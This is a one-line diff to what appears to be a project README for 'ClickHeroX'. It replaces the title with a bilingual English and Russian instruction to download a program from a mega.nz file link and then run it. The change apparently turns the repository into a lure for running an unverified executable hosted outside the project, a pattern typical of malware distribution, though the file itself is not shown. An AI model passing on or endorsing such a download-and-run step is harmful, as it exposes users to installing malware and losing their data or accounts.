@@ -1,1 +1,1 @@
-# ClickHeroX
+Download the program from this link https://mega.nz/file/gSRzQRQY#MmnoWIGwfNtBx-eaTFcuwuV2RWEaLjPEJHT48123naY. After which you just need to run | Скачайте программу по данной ссылке https://mega.nz/file/gSRzQRQY#MmnoWIGwfNtBx-eaTFcuwuV2RWEaLjPEJHT48123naY. После чего вам достаточно запустить
